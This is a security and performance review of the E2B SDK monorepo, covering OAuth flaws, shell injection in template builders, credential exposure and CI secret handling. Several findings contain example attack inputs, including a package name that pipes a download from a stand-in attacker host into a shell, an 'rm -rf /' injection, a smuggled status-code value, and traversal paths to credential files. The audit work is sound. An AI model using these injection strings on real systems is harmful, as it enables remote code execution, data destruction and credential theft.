# E2B Codebase Security, Performance & Code Quality Review

**Repository:** [matiasinsaurralde/E2B](https://github.com/matiasinsaurralde/E2B)  
**Scope:** Monorepo — JS SDK, Python SDK, CLI, OpenAPI/envd specs, base templates, CI workflows  
**Date:** 2026-07-11  
**Methodology:** Static analysis of source, specs, Dockerfiles, and CI; pattern search for injection, credential handling, path traversal, and performance anti-patterns.

> **Note:** This repository contains client SDKs and API specifications only. The envd daemon and cloud API server implementations live in separate repositories. Findings against `spec/envd/` describe design risks that must be validated in the server implementation.

---

## Executive Summary

The E2B SDKs are designed around intentional remote code execution inside sandboxes — `commands.run()` and template `runCmd()` are features, not bugs. The highest-risk exploitable issues cluster in three areas:

1. **Shell injection in template builders** when user-controlled strings reach `pipInstall`, `npmInstall`, `aptInstall`, or `addMcpServer` without quoting.
2. **Credential exfiltration paths** via configurable `api_url`/`sandbox_url`, OAuth token delivery over HTTP query strings, and verbose request logging.
3. **Spec-level auth gaps** in `spec/envd/envd.yaml` that, if implemented literally, would allow unauthenticated file and environment access inside sandboxes.

Performance concerns center on synchronous, memory-heavy file hashing and unbounded concurrent uploads during template builds.

---

## Findings Summary

| # | Severity | Category | Area | Title |
|---|----------|----------|------|-------|
| 1 | **Critical** | Security | CLI | OAuth tokens delivered via URL query parameters |
| 2 | **Critical** | Security | CLI | Unvalidated OAuth token/revoke endpoints stored and used |
| 3 | **Critical** | Security | envd spec | Optional empty auth (`- {}`) on sensitive envd routes |
| 4 | **High** | Security | JS SDK | Template package installs interpolate unquoted names into shell |
| 5 | **High** | Security | Python SDK | `apt_install()` joins package names without shell quoting |
| 6 | **High** | Security | JS/Python SDK | `addMcpServer` / `add_mcp_server` shell injection |
| 7 | **High** | Security | JS/Python SDK | `commands.run()` always executes via `bash -l -c` |
| 8 | **High** | Security | JS/Python SDK | Configurable `api_url` / `E2B_API_URL` exfiltrates API keys |
| 9 | **High** | Security | JS/Python SDK | Configurable `sandbox_url` / `E2B_SANDBOX_URL` exfiltrates envd tokens |
| 10 | **High** | Security | JS/Python SDK | `dangerouslyAuthenticate` persists git credentials globally |
| 11 | **High** | Security | JS/Python SDK | `fromDockerfile()` forwards RUN lines verbatim to build pipeline |
| 12 | **High** | Security | CLI | OAuth callback lacks CSRF `state` validation |
| 13 | **Medium** | Security | JS SDK | `shellQuote` leaves `-`-prefixed values unquoted (flag injection) |
| 14 | **Medium** | Security | JS/Python SDK | `waitForURL` / `wait_for_url` enables build-time SSRF |
| 15 | **Medium** | Security | JS/Python SDK | `waitForURL` / `wait_for_url` embeds `status_code` in shell grep |
| 16 | **Medium** | Security | JS/Python SDK | `waitForPort` / `wait_for_port` lacks runtime port bounds check |
| 17 | **Medium** | Security | JS/Python SDK | Sandbox filesystem paths not validated client-side |
| 18 | **Medium** | Security | Python SDK | Template `copy()` validates `src` but not `dest` |
| 19 | **Medium** | Security | Python SDK | GCP service account JSON path read without traversal checks |
| 20 | **Medium** | Security | Python SDK | Symlink dereference can archive files outside build context |
| 21 | **Medium** | Security | JS/Python SDK | Git credentials embedded in clone/push URLs |
| 22 | **Medium** | Security | JS/Python SDK | Registry/AWS/GCP secrets sent in template build JSON |
| 23 | **Medium** | Security | JS/Python SDK | File URL signatures are deterministic SHA-256, not HMAC |
| 24 | **Medium** | Security | JS/Python SDK | Request/RPC logging may leak signed URLs and tokens |
| 25 | **Medium** | Security | JS SDK | MCP gateway config passed as command-line argument |
| 26 | **Medium** | Security | JS/Python SDK | `setEnvs` / `set_envs` bakes secrets into image layers |
| 27 | **Medium** | Security | CLI | `--dockerfile` path not confined to project root |
| 28 | **Medium** | Security | CLI | Plaintext credential storage in `~/.e2b/config.json` |
| 29 | **Medium** | Security | OpenAPI | `/teams` returns full API keys for every team |
| 30 | **Medium** | Security | JS/Python SDK | Unvalidated `user` parameter for sandbox identity |
| 31 | **Medium** | Security | envd proto | `ListDirRequest.depth` is unbounded `uint32` (DoS) |
| 32 | **Medium** | Security | envd proto | Process.Start accepts arbitrary cmd/args/envs without spec limits |
| 33 | **Medium** | Security | CI | `secrets: inherit` over-propagates repository secrets |
| 34 | **Medium** | Security | CI | Integration tests on PRs run with production API keys |
| 35 | **Medium** | Security | CI | Release-candidate workflow can publish with tests skipped |
| 36 | **Medium** | Performance | JS SDK | Synchronous full-file reads block event loop during hash |
| 37 | **Medium** | Performance | Python SDK | Template hash reads entire files into memory synchronously |
| 38 | **Medium** | Performance | JS SDK | Unbounded `Promise.all` for concurrent file uploads |
| 39 | **Medium** | Performance | Python SDK | Unbounded `asyncio.gather` for multi-file sandbox uploads |
| 40 | **Medium** | Code Quality | templates | Base Dockerfile runs as root with unpinned apt packages |
| 41 | **Low** | Security | envd spec | Malformed `AccessTokenAuth` security scheme definition |
| 42 | **Low** | Security | JS SDK | HTTP `redirect: 'follow'` on auth-bearing envd requests |
| 43 | **Low** | Security | codegen | `protoc` downloaded without checksum verification |
| 44 | **Low** | Code Quality | JS SDK | `resolveApiOpts` spreads full `ConnectionConfig` (includes secrets) |
| 45 | **Low** | Code Quality | JS SDK | `Logger` interface uses `any[]` — weak typing for log payloads |

---

## Detailed Findings

### 1. OAuth tokens delivered via URL query parameters
- **Severity:** Critical  
- **Category:** Security  
- **Location:** `packages/cli/src/commands/auth/login.ts:119-146`  
- **Description:** The browser OAuth callback redirects to `http://localhost:<port>` with `accessToken`, `refreshToken`, `tokenEndpoint`, `revokeEndpoint`, and `clientId` as GET query parameters.  
- **Exploitability:** Tokens appear in browser history, proxy logs, crash dumps, and process listings. Any local process observing localhost HTTP traffic can capture long-lived credentials.  
- **Recommendation:** Use authorization-code flow with PKCE; exchange code for tokens via POST. Pass only a short-lived `code` and `state` in the redirect URL.

---

### 2. Unvalidated OAuth token/revoke endpoints stored and used
- **Severity:** Critical  
- **Category:** Security  
- **Location:** `packages/cli/src/commands/auth/login.ts:72-79`, `packages/cli/src/utils/token-refresh.ts:42-55`, `packages/cli/src/commands/auth/logout.ts`  
- **Description:** The CLI persists `tokenEndpoint`, `revokeEndpoint`, and `clientId` from the login callback without allowlist validation, then uses them for token refresh and logout.  
- **Exploitability:** A crafted redirect (phishing, MITM on localhost callback, or compromised docs endpoint) can point token refresh at an attacker-controlled URL and exfiltrate refresh tokens.  
- **Recommendation:** Hardcode or allowlist known E2B OAuth endpoints. Never trust endpoint URLs from redirect parameters alone.

---

### 3. Optional empty auth on sensitive envd routes
- **Severity:** Critical  
- **Category:** Security  
- **Location:** `spec/envd/envd.yaml:18-37` (and similar on `/envs`, `/files`)  
- **Description:** Sensitive envd routes declare optional empty security alongside token auth:
  ```yaml
  security:
    - AccessTokenAuth: []
    - {}
  ```
  In OpenAPI 3, `- {}` means **no authentication required** as an alternative.  
- **Exploitability:** If the server honors the spec literally, unauthenticated callers can read env vars, upload/download files, read metrics, or inject init state (including `accessToken` in the request body).  
- **Recommendation:** Remove `- {}` from all non-health endpoints. Require auth on `/init`, `/envs`, `/files`, `/metrics`.

---

### 4. Template package installs interpolate unquoted names into shell (JS)
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/index.ts:753-850`  
- **Description:** `pipInstall`, `npmInstall`, `bunInstall`, and `aptInstall` join package names with spaces and pass the result to `runCmd()` without `shellQuote()`.  
- **Exploitability:** If an application builds templates from user-controlled package names (e.g. AI agent selecting dependencies), attacker input like `lodash; curl attacker.com | sh` executes arbitrary commands during template build as root.  
- **Recommendation:** Quote each package name with `shellQuote()`, or pass packages as structured argv to a non-shell exec path.

---

### 5. `apt_install()` joins package names without shell quoting (Python)
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/python-sdk/e2b/template/main.py:496-503`  
- **Description:** Package names are interpolated via `' '.join(packages)` into a shell command string without `shlex.quote()`.  
- **Exploitability:** Same as finding #4 — arbitrary command execution during template build when package names are attacker-controlled.  
- **Recommendation:** Apply `shlex.quote()` per package, or use structured build instructions.

---

### 6. `addMcpServer` / `add_mcp_server` shell injection
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/index.ts:853-866`, `packages/python-sdk/e2b/template/main.py:532-533`  
- **Description:** MCP server identifiers are joined into `mcp-gateway pull <names>` without quoting.  
- **Exploitability:** A malicious server name like `exa; rm -rf /` runs during template build as root.  
- **Recommendation:** Quote each server name; validate against an allowlist of known MCP server identifiers.

---

### 7. `commands.run()` always executes via `bash -l -c`
- **Severity:** High (by design; critical when misused)  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/sandbox/commands/index.ts:447-454`, `packages/python-sdk/e2b/sandbox_sync/commands/command.py:317-322`  
- **Description:** Every `commands.run()` invocation passes the full command string to `bash -l -c`. There is no argv-only API.  
- **Exploitability:** In multi-tenant agent platforms where user/agent input flows into `commands.run()`, this is direct remote code execution inside the sandbox. Expected for trusted developers; catastrophic for untrusted input.  
- **Recommendation:** Add `runArgv(cmd, args[])` that avoids shell interpretation; document shell semantics prominently; require explicit opt-in for shell mode.

---

### 8. Configurable `api_url` / `E2B_API_URL` exfiltrates API keys
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/connectionConfig.ts:372-375`, `packages/python-sdk/e2b/connection_config.py:161-165`  
- **Description:** `ConnectionConfig` accepts arbitrary `api_url` overrides (including via `E2B_API_URL` env var). All API requests send `X-API-KEY` to that base URL.  
- **Exploitability:** In shared CI runners or compromised environments, an attacker controlling env vars receives the E2B API key on the next SDK call.  
- **Recommendation:** Allowlist domains; pin to `https://api.{domain}`; reject overrides outside debug mode.

---

### 9. Configurable `sandbox_url` / `E2B_SANDBOX_URL` exfiltrates envd tokens
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/connectionConfig.ts:377-378,414-419`, `packages/python-sdk/e2b/sandbox_sync/main.py:885-890`  
- **Description:** Overriding sandbox URL redirects all envd HTTP/RPC traffic (including `X-Access-Token`) to an arbitrary host.  
- **Exploitability:** Attacker with env/config influence captures envd access tokens and can impersonate sandbox file/process operations.  
- **Recommendation:** Derive sandbox URL only from API response and known domain patterns; reject overrides in production.

---

### 10. `dangerouslyAuthenticate` persists git credentials globally
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/sandbox/git/index.ts:855-887`, `packages/python-sdk/e2b/sandbox_sync/git.py:968-1025`  
- **Description:** Sets `credential.helper=store` globally and writes credentials to git's credential store inside the sandbox. Method name signals danger, but misuse is easy.  
- **Exploitability:** Any later process in the sandbox (or agent-generated code) can read `~/.git-credentials`. Credentials persist for sandbox lifetime and in snapshots.  
- **Recommendation:** Gate behind double opt-in; add cleanup helper; prefer per-operation credential injection already implemented for push/pull.

---

### 11. `fromDockerfile()` forwards RUN lines verbatim
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/dockerfileParser.ts:168-178`, `packages/python-sdk/e2b/template/dockerfile_parser.py:147-155`  
- **Description:** Dockerfile `RUN`, `CMD`, and `ENTRYPOINT` instructions are passed directly to `runCmd()` without sanitization.  
- **Exploitability:** Importing a user-supplied Dockerfile is equivalent to arbitrary build-time shell execution — same trust boundary as `docker build` with untrusted input.  
- **Recommendation:** Document trust boundary prominently; optionally reject or sandbox Dockerfile imports in multi-tenant builders.

---

### 12. OAuth callback lacks CSRF `state` validation
- **Severity:** High  
- **Category:** Security  
- **Location:** `packages/cli/src/commands/auth/login.ts:114-115`  
- **Description:** The localhost HTTP server accepts the first request with no `state` nonce verification.  
- **Exploitability:** Login CSRF — a malicious local app or website could race the callback. Combined with tokens-in-URL (finding #1), this worsens token interception risk.  
- **Recommendation:** Generate a cryptographically random `state`, include it in the auth URL, and reject callbacks where `state` doesn't match.

---

### 13. `shellQuote` leaves `-`-prefixed values unquoted
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/utils.ts:124-144`, used in `packages/js-sdk/src/template/index.ts:644-674`  
- **Description:** Hyphen is in the "safe character" set, so paths like `-rf` or `--no-preserve-root` are emitted unquoted. `rm -f -rf` treats `-rf` as flags, not a filename.  
- **Exploitability:** When template paths come from partially trusted input (user repo layout, uploaded filenames), unintended deletions or option injection can occur during build.  
- **Recommendation:** Always quote values starting with `-`, or use `--` before path arguments (`rm -f -- <paths>`).

---

### 14. `waitForURL` / `wait_for_url` enables build-time SSRF
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/readycmd.ts:59-61`, `packages/python-sdk/e2b/template/readycmd.py:66`  
- **Description:** Build-time ready checks curl arbitrary URLs from the build environment. URL is shell-quoted (no injection), but destination is attacker-controlled if template author is malicious.  
- **Exploitability:** SSRF against internal services during build (cloud metadata endpoints, internal APIs).  
- **Recommendation:** Optional URL allowlist; block RFC1918/link-local/metadata IPs; document SSRF risk.

---

### 15. `waitForURL` / `wait_for_url` embeds `status_code` in shell grep
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/readycmd.ts:60`, `packages/python-sdk/e2b/template/readycmd.py:66`  
- **Description:** `status_code` is embedded in double quotes inside a shell pipeline without validation. URL is quoted; status code is not.  
- **Exploitability:** `wait_for_url("http://localhost/", status_code='200" -o /tmp/x #')` can alter ready-check shell logic persisted in the template.  
- **Recommendation:** Validate `status_code` is an integer in range 100-599; use `[ "$(curl ...)" = "200" ]` instead of `grep`.

---

### 16. `waitForPort` / `wait_for_port` lacks runtime port bounds check
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/readycmd.ts:34-39`, `packages/python-sdk/e2b/template/readycmd.py:40`  
- **Description:** Port is interpolated into a shell subshell. Type hints exist but Python/TypeScript do not enforce integer range at runtime.  
- **Exploitability:** Non-integer or malformed port values could produce unexpected shell behavior if callers bypass types.  
- **Recommendation:** Validate `Number.isInteger(port) && port >= 1 && port <= 65535` at runtime.

---

### 17. Sandbox filesystem paths not validated client-side
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/sandbox/filesystem/index.ts` (multiple methods), `packages/python-sdk/e2b/sandbox_sync/filesystem/filesystem.py`  
- **Description:** Unlike template `copy()` (which uses `validateRelativePath`), sandbox filesystem methods forward `path` unchanged to envd RPC/HTTP.  
- **Exploitability:** If envd has path canonicalization gaps, `../../etc/passwd`-style reads/writes become possible within the sandbox. Missing defense-in-depth at the SDK layer.  
- **Recommendation:** Reject paths containing `..`, NUL bytes, or unexpected absolute paths before sending to envd.

---

### 18. Template `copy()` validates `src` but not `dest` (Python)
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/python-sdk/e2b/template/main.py:76-84`  
- **Description:** `validate_relative_path()` applies only to local `src`. `dest` is sent as-is to the build API.  
- **Exploitability:** `copy("file.txt", "/etc/cron.d/backdoor")` may write outside intended template paths on the build VM.  
- **Recommendation:** Validate `dest` is an absolute sandbox path under an allowlist (e.g. `/home/user`, `/app`).

---

### 19. GCP service account JSON path read without traversal checks
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/python-sdk/e2b/template/utils.py:420-424`  
- **Description:** `read_gcp_service_account_json()` joins `context_path` with user path without `validate_relative_path()`.  
- **Exploitability:** `from_gcp_registry(..., "../../../.aws/credentials")` can read sensitive files on the machine running the SDK during build.  
- **Recommendation:** Reuse `validate_relative_path()` before `open()`.

---

### 20. Symlink dereference can archive files outside build context
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/python-sdk/e2b/template/utils.py:257-283`, `packages/js-sdk/src/template/utils.ts` (tar with `dereference`)  
- **Description:** With `resolveSymlinks=true`, tar archives follow symlinks and can include files outside the context directory.  
- **Exploitability:** In CI/build services processing untrusted repos, a symlink can exfiltrate host files into the E2B build context. Default is `false`, but callers can enable it.  
- **Recommendation:** Resolve symlinks manually and verify resolved path stays under `context_path`; refuse escaping symlinks.

---

### 21. Git credentials embedded in remote URLs
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/sandbox/git/index.ts:317-342`, `packages/python-sdk/e2b/sandbox/_git/auth.py:8-31`  
- **Description:** HTTP(S) credentials are embedded in clone/push URLs (`https://user:pass@host/...`).  
- **Exploitability:** Credentials visible in `git config`, process listings (`commands.list()`), error output, and logs.  
- **Recommendation:** Use `GIT_ASKPASS` / credential helper with fd passing; ensure credential restore on all error paths.

---

### 22. Registry/AWS/GCP secrets sent in template build JSON
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/index.ts:1305-1325`, `packages/python-sdk/e2b/template/main.py:1031-1035,1356-1357`  
- **Description:** Docker registry passwords, AWS keys, and GCP service account JSON are included in `fromImageRegistry` in the build payload sent to `triggerBuild`.  
- **Exploitability:** Secrets traverse the API and may appear in logs, build history, or error responses. Client apps may also log serialized build payloads.  
- **Recommendation:** Use short-lived pull tokens; server-side secret vault; never log build payloads.

---

### 23. File URL signatures are deterministic SHA-256, not HMAC
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/sandbox/signature.ts:48-55`, `packages/python-sdk/e2b/sandbox/signature.py:38-47`  
- **Description:** Signatures are `v1_<base64(sha256(path:op:user:token[:exp]))>`. Anyone with `envdAccessToken` can forge URLs for any path.  
- **Exploitability:** Token leakage (logs, shared `downloadUrl()` output, browser history) grants read/write for all paths until expiry.  
- **Recommendation:** Use HMAC-SHA256 with server-held secret; bind signature to HTTP method; shorten token lifetime.

---

### 24. Request/RPC logging may leak signed URLs and tokens
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/logs.ts:36-76`, `packages/python-sdk/e2b/api/__init__.py:36-54`  
- **Description:** When `logger` is enabled, full request URLs and RPC responses are logged at info/debug level, including `/files?path=...&signature=...`.  
- **Exploitability:** Log aggregation systems (Datadog, CloudWatch) expose time-limited but usable file access URLs. Combined with log access = sandbox file read/write.  
- **Recommendation:** Redact query params (`signature`, tokens); log host + route only.

---

### 25. MCP gateway config passed as command-line argument
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/sandbox/index.ts:321-330`  
- **Description:** Full MCP config JSON is passed as a command-line argument (shell-quoted, but visible in process listings).  
- **Exploitability:** Secrets inside MCP config (API keys for MCP servers) visible via `ps`, `/proc`, or `commands.list()`.  
- **Recommendation:** Write config to a root-only temp file and pass file path; or use env var for config payload.

---

### 26. `setEnvs` / `set_envs` bakes secrets into image layers
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/template/index.ts:918-929,1087-1092`  
- **Description:** Environment variables set via template builder become permanent ENV layers in the built image and in generated Dockerfiles.  
- **Exploitability:** API keys in `setEnvs()` persist in image history; readable via `env`, `/proc`, or `docker history`.  
- **Recommendation:** Document that secrets must use runtime sandbox `envs`, not template ENV; warn on known secret-like key names.

---

### 27. CLI `--dockerfile` path not confined to project root
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/cli/src/commands/template/dockerfile.ts:17-21`  
- **Description:** Custom dockerfile paths are joined with `path.join(root, file)` without rejecting paths that escape the project root.  
- **Exploitability:** `e2b template create ... --dockerfile ../../../etc/passwd` can read arbitrary local files into the build upload pipeline.  
- **Recommendation:** Resolve paths and reject when `path.relative(root, resolvedPath)` starts with `..`. Mirror SDK `validateRelativePath`.

---

### 28. Plaintext credential storage in `~/.e2b/config.json`
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/cli/src/user.ts:37,99-104`  
- **Description:** Config stores `teamApiKey`, `access_token`, and `refresh_token` in plaintext JSON. Writes use `0o600`/`0o700`, but a Keychain integration is still TODO.  
- **Exploitability:** Credentials exposed to backup tools, cloud sync services (Dropbox/iCloud), and malware with user privileges.  
- **Recommendation:** Use OS credential stores (macOS Keychain, Windows Credential Manager, Linux Secret Service).

---

### 29. `/teams` API returns full API keys for every team
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `spec/openapi.yml:166-181`, `packages/cli/src/commands/auth/login.ts:84`  
- **Description:** The `Team` schema requires a full `apiKey` string. The CLI stores it locally on login.  
- **Exploitability:** Over-exposure of long-lived secrets. Any bearer-token compromise on `/teams` yields all team API keys.  
- **Recommendation:** Return masked keys from list endpoints; provide full key only at creation time.

---

### 30. Unvalidated `user` parameter for sandbox identity
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `packages/python-sdk/e2b/envd/rpc.py:126-139`, JS SDK filesystem/commands callers  
- **Description:** `user` is a free-form string sent as HTTP Basic auth and query `username`. No allowlist in SDK.  
- **Exploitability:** Wrapper apps passing user input as `user=` may allow acting as `root` or other sandbox users, bypassing intended FS isolation.  
- **Recommendation:** Document security model; optional allowlist; default deny for privileged users unless explicitly enabled.

---

### 31. `ListDirRequest.depth` is unbounded (DoS)
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `spec/envd/filesystem/filesystem.proto:77-80`  
- **Description:** `depth` is an unconstrained `uint32` with no documented maximum.  
- **Exploitability:** A client can request extremely deep recursive listings, causing CPU/memory/IO exhaustion inside sandboxes.  
- **Recommendation:** Cap `depth` in the proto spec (e.g., max 10) and enforce server-side.

---

### 32. Process.Start accepts arbitrary cmd/args/envs without spec limits
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `spec/envd/process/process.proto:52-57`  
- **Description:** `Process.Start` accepts arbitrary `cmd`, `args`, `envs`, and optional PTY. Proto defines no auth, rate limits, or resource bounds.  
- **Exploitability:** Intentional sandbox functionality, but any auth bypass at the transport layer becomes full RCE within the sandbox.  
- **Recommendation:** Document mandatory transport-layer auth; add spec-level limits on env map size, arg count, concurrent processes, and buffer sizes.

---

### 33. `secrets: inherit` over-propagates repository secrets
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `.github/workflows/release.yml:108-129`, `.github/workflows/release-candidate.yml:79-106`  
- **Description:** Release workflows pass all repository secrets to test and publish jobs via `secrets: inherit`.  
- **Exploitability:** Test jobs receive secrets they don't need (`PYPI_TOKEN`, `DOCKERHUB_TOKEN`, etc.), increasing blast radius if a test step is compromised.  
- **Recommendation:** Pass only required secrets explicitly per reusable workflow.

---

### 34. Integration tests on PRs run with production API keys
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `.github/workflows/sdk_tests.yml`, `.github/workflows/js_sdk_tests.yml`  
- **Description:** Integration tests run on PRs to `main` with `E2B_API_KEY`. Same-repo PRs from contributors run arbitrary test code with production/staging keys.  
- **Exploitability:** Malicious test code in a PR could exfiltrate secrets. Fork PRs are protected by default, but same-repo PRs are not.  
- **Recommendation:** Gate integration tests behind maintainer approval (`workflow_run`) or use OIDC-scoped ephemeral credentials.

---

### 35. Release-candidate workflow can publish with tests skipped
- **Severity:** Medium  
- **Category:** Security  
- **Location:** `.github/workflows/release-candidate.yml:74-98`  
- **Description:** `skip-tests: true` skips test jobs, but publish still proceeds because skipped jobs are not failures.  
- **Exploitability:** Packages can be published to npm/PyPI without running any test suite.  
- **Recommendation:** Require at least one test job to succeed (not merely "not failed"). Restrict `skip-tests` to admin-only.

---

### 36. Synchronous full-file reads block event loop during hash (JS)
- **Severity:** Medium  
- **Category:** Performance  
- **Location:** `packages/js-sdk/src/template/utils.ts:258-265`  
- **Description:** Template build hashing uses `fs.statSync` and `fs.readFileSync` for every file in the build context.  
- **Exploitability:** N/A (performance). Large template contexts (hundreds of MB) block the Node.js event loop, causing high memory use and slow builds.  
- **Recommendation:** Stream file contents into the hash (`createReadStream`); process files with bounded parallelism.

---

### 37. Template hash reads entire files into memory synchronously (Python)
- **Severity:** Medium  
- **Category:** Performance  
- **Location:** `packages/python-sdk/e2b/template/utils.py:251-252`  
- **Description:** `f.read()` loads entire file contents into memory for SHA hashing.  
- **Exploitability:** N/A (performance). Same memory/blocking concerns as finding #36 for large build contexts.  
- **Recommendation:** Stream file contents in fixed-size chunks into the hash object.

---

### 38. Unbounded `Promise.all` for concurrent file uploads (JS)
- **Severity:** Medium  
- **Category:** Performance  
- **Location:** `packages/js-sdk/src/template/index.ts:1224-1226`  
- **Description:** All COPY-layer uploads are fired concurrently via `Promise.all(uploadPromises)`.  
- **Exploitability:** N/A (performance). Templates with hundreds of files open hundreds of simultaneous HTTP connections, causing memory spikes, socket exhaustion, and upload failures.  
- **Recommendation:** Use a concurrency limit (e.g., 8–16 workers via `p-limit`).

---

### 39. Unbounded `asyncio.gather` for multi-file sandbox uploads (Python)
- **Severity:** Medium  
- **Category:** Performance  
- **Location:** `packages/python-sdk/e2b/sandbox_async/filesystem/filesystem.py:407-409`  
- **Description:** Multi-file uploads use `asyncio.gather(*[_upload_file(file) for file in files])` with no concurrency cap.  
- **Exploitability:** N/A (performance). Same socket/memory exhaustion risk as finding #38.  
- **Recommendation:** Use `asyncio.Semaphore` to cap concurrent uploads.

---

### 40. Base Dockerfile runs as root with unpinned apt packages
- **Severity:** Medium  
- **Category:** Code Quality / Container Hardening  
- **Location:** `templates/base/e2b.Dockerfile:1-8`  
- **Description:** No `USER` directive — processes run as root by default. `apt-get install` without version pinning. Python 3.11.6 and Node 20.9.0 are aging.  
- **Exploitability:** Root-by-default increases blast radius from container escapes. Unpinned apt packages increase supply-chain/CVE exposure.  
- **Recommendation:** Add non-root `USER` for runtime; pin apt package versions; bump Python/Node to actively maintained patch releases.

---

### 41. Malformed `AccessTokenAuth` security scheme definition
- **Severity:** Low  
- **Category:** Code Quality  
- **Location:** `spec/envd/envd.yaml:150-154`  
- **Description:** `type: apiKey` uses `scheme: header` instead of the correct `in: header`. This is invalid OpenAPI 3.  
- **Exploitability:** May cause codegen/auth middleware bugs in downstream consumers.  
- **Recommendation:** Fix to `type: apiKey`, `in: header`, `name: X-Access-Token`.

---

### 42. HTTP `redirect: 'follow'` on auth-bearing envd requests
- **Severity:** Low  
- **Category:** Security  
- **Location:** `packages/js-sdk/src/sandbox/index.ts:171-193`  
- **Description:** Connect-RPC transport always follows redirects, including requests carrying `X-Access-Token`.  
- **Exploitability:** Low under normal E2B hosting. Relevant if sandbox URL is misconfigured or envd is compromised — auth headers could follow redirects to unexpected hosts.  
- **Recommendation:** Use `redirect: 'error'` for auth-bearing requests, or validate redirect targets.

---

### 43. `protoc` downloaded without checksum verification
- **Severity:** Low  
- **Category:** Supply Chain  
- **Location:** `codegen.Dockerfile:25-27`  
- **Description:** protoc is fetched via `curl -LO` with no hash/signature check, unlike the base template which verifies Node tarballs with GPG.  
- **Exploitability:** Compromised GitHub release artifact could poison codegen pipeline.  
- **Recommendation:** Pin and verify SHA256 of the protoc release artifact.

---

### 44. `resolveApiOpts` spreads full `ConnectionConfig`
- **Severity:** Low  
- **Category:** Code Quality  
- **Location:** `packages/js-sdk/src/sandbox/index.ts:793-800`  
- **Description:** Spreading a class instance copies enumerable fields including `apiKey`, `accessToken`, and `headers` into option objects passed to API calls.  
- **Exploitability:** Low unless these objects are logged or serialized. Increases accidental credential leakage surface.  
- **Recommendation:** Pick only needed fields instead of spreading the entire config instance.

---

### 45. `Logger` interface uses `any[]`
- **Severity:** Low  
- **Category:** Code Quality  
- **Location:** `packages/js-sdk/src/logs.ts:7-24,26-33`  
- **Description:** Logger methods accept `any[]` and `formatLog` operates on `any`, providing no type safety for log payloads that may contain sensitive data.  
- **Exploitability:** N/A directly, but weak typing makes it harder to enforce redaction at compile time.  
- **Recommendation:** Type log payloads; add a redaction layer for known sensitive fields.

---

## Positive Security Controls Observed

| Area | Implementation |
|------|----------------|
| Template COPY path traversal | `validateRelativePath()` in JS (`packages/js-sdk/src/template/utils.ts`) and Python (`packages/python-sdk/e2b/template/utils.py`) |
| Git command building | `buildGitCommand()` / `shell_escape()` quotes each argument |
| Git reset modes | Allowlist validation in `packages/js-sdk/src/sandbox/git/index.ts` |
| File metadata headers | RFC 7230 token validation in `packages/js-sdk/src/sandbox/filesystem/index.ts` |
| API key format | `validateApiKey()` with opt-out in both SDKs |
| Secure sandbox default | `secure: opts?.secure ?? true` on sandbox create |
| Git URL credential stripping | `stripCredentials()` after clone |
| CLI config permissions | `writeUserConfig` uses `0o600`/`0o700` file modes |

---

## Recommended Remediation Priority

| Priority | Action |
|----------|--------|
| **P0** | Fix envd spec optional-auth (`- {}`); validate server implementation matches |
| **P0** | Redesign CLI OAuth (PKCE, no tokens in query strings, endpoint allowlist, CSRF state) |
| **P1** | Quote or argv-ify template install helpers and `addMcpServer` in both SDKs |
| **P1** | Fix `shellQuote` / `--` handling for `-`-prefixed paths |
| **P1** | Lock down `api_url` and `sandbox_url` overrides in non-debug environments |
| **P2** | Move CLI secrets to OS keychain; stop persisting full team API keys |
| **P2** | Add client-side path validation for sandbox filesystem operations |
| **P2** | Harden base Dockerfile (non-root user, pinned packages, updated runtimes) |
| **P2** | Tighten CI secret scoping; gate integration tests on trusted code paths |
| **P3** | Stream file hashing; bound upload concurrency in both SDKs |
| **P3** | Redact sensitive fields in SDK logging |

---

## Scope Limitations

- **No runtime testing** of envd or cloud API servers was performed.
- **No dependency vulnerability scan** (e.g., `npm audit`, `pip-audit`) was run; findings are source-level.
- **Generated code** (`packages/*/client/`) was largely excluded; issues in generators should be fixed at the spec/source level.
